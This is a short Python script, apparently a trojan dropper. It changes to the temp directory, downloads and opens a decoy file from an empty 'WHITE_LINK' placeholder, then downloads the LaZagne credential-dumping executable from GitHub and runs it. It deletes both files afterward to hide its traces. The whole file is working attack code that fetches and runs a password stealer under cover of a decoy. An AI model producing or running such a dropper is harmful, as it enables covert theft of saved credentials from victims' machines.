#!/usr/bin/env python

import subprocess
import requests
import tempfile
import os

#lazagne Link
WHITE_LINK=""
DARK_LINK = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe"


def download_file(url):
      get_resp = requests.get(url)
      file_name = url.split("/")[-1]
      with open(file_name,"wb") as out_file:
            out_file.write(get_resp.content)
      return file_name


def delete_file(file):
      os.remove(file)

#move to temp DIR       
TEMP_DIR = tempfile.gettempdir()
os.chdir(TEMP_DIR)

white_file_name = download_file(WHITE_LINK)
subprocess.Popen(white_file_name, shell=True)

dark_file_name  = download_file(DARK_LINK)
subprocess.call(dark_file_name,shell=True)

delete_file(white_file_name)
delete_file(dark_file_name)
